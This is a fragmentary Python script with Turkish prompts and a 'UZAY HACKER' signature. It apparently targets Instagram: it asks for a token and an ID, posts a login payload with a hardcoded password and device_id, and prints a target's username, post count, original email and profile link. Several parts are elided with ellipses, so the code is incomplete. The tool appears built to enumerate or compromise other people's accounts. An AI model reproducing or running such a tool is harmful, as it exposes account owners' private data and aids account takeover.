...
es = input(f' {F}({C}1{F}) {X} SALLA BURAYI  SİKTİRET{F}  '+Z)
print(X+' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
token = input(f' {F}({C}2{F}) {X} TOKEN GİR  {F}  '+Z)
print(X+' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
ID = input(f' {F}({C}3{F}) {X} İD GİR {F}  '+Z)
os.system('clear')
head = {
'accept': '*/*',
...
'Accept-Encoding': 'gzip',
 ...
 data = {"username":email,"password":"ndidsgdubddjdubdhd",
"device_id":uis,
}
...
AD İSTEAQ» [{user}]  
 ...
 POST » [{Post}]   
 ORJİ MAİL » [{rest}]
 LİNK » https://www.instagram.com/{user}   
———————×———————
UZAY HACKER MERAHH
———————×———————
	''')
